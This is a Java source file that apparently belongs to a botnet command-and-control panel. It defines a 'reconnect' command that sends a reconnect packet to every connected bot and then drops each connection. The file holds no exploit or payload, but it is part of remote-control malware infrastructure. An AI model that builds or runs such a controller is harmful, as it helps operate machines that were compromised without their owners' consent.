package com.redpois0n.commands;

import com.redpois0n.bot.Bot;
import com.redpois0n.bot.Main;
import com.redpois0n.common.packets.Headers;


public class CommandReconnect extends Command {

	/**
	 * Writes reconnect packet and closes connection
	 */
	@Override
	public void execute(String[] args, Bot[] bots) throws Exception {
		for (int i = 0; i < bots.length; i++) {
			try {
				Bot bot = bots[i];
				bot.writeByte(Headers.PACKET_RECONNECT);
				bot.disconnect();
			} catch (Exception ex) {
				Main.handleException(ex);
			}
		}
	}

	@Override
	public String getUsage() {
		return "reconnect";
	}

	@Override
	public String getExample() {
		return "reconnect";
	}

	@Override
	public String getDescription() {
		return "All bots will disconnect and then connect after set timeout";
	}

}
